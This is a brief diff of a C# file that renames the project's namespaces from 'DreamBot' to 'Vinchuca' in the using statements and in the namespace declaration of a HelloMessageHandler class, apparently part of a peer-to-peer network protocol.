@@ -1,11 +1,11 @@
 using System;
 using System.Diagnostics;
-using DreamBot.Crypto;
-using DreamBot.Network.Protocol.Messages;
-using DreamBot.Network.Protocol.Messages.System;
-using DreamBot.Network.Protocol.Peers;
+using Vinchuca.Crypto;
+using Vinchuca.Network.Protocol.Messages;
+using Vinchuca.Network.Protocol.Messages.System;
+using Vinchuca.Network.Protocol.Peers;
 
-namespace DreamBot.Network.Protocol.Handlers
+namespace Vinchuca.Network.Protocol.Handlers
 {
     public class HelloMessageHandler : IMessageHandler
     {
